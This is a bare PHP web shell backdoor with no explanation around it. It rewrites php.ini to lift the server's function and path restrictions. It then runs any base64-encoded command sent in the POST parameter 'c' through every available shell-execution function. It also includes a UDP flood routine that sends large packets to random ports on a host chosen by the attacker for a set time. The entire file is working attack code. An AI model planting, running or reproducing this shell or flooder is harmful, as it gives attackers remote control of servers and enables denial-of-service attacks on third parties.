<?php
ini_restore('disable_functions');
$ini = base64_decode('ZGlzYWJsZV9mdW5jdGlvbnM9ZGwKb3Blbl9iYXNlZGlyPS8Kc2FmZV9tb2RlPW9mZgoK'); 
if(!file_exists('php.ini')) {
$phpini = fopen('php.ini','w'); fwrite($phpini,$ini); fclose($phpini); }
if (!function_exists("b0ss")) { function b0ss($cmd) {  $result = ""; if (!empty($cmd)) { if (is_callable("exec")) {exec($cmd,$result); $result = join("\n",$result);} elseif (is_callable("shell_exec")) {$result = shell_exec($cmd);} elseif (is_callable("system")) {@ob_start(); system($cmd); $result = @ob_get_contents(); @ob_end_clean();} elseif (is_callable("passthru")) {@ob_start(); passthru($cmd); $result = @ob_get_contents(); @ob_end_clean();} elseif (is_callable("passthru")) {@ob_start(); passthru($cmd); $result = @ob_get_contents(); @ob_end_clean();} elseif (($result = `$cmd`) !== false) {}elseif (is_resource($fp = popen($cmd,"r"))) { $result = ""; while(!feof($fp)) {$result .= fread($fp,1024);} pclose($fp); } } return $result; } }
if(isset($_POST['c'])) { echo b0ss(base64_decode($_POST['c'])); }
if(isset($_POST['h'])&&isset($_POST['t'])){
    ignore_user_abort(TRUE); set_time_limit(0); $exec_time = $_POST['t']; $time = time(); $max_time = $time+$exec_time; $host = $_POST['h'];
    for($i=0;$i<65000;$i++){ $out .= 'h'; }
    while(1){ if(time() > $max_time){ break; } $rand = rand(1,65000); $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5); if($fp){ fwrite($fp, $out); fclose($fp); } else { echo 'Failed to open socket'; } } }
?>
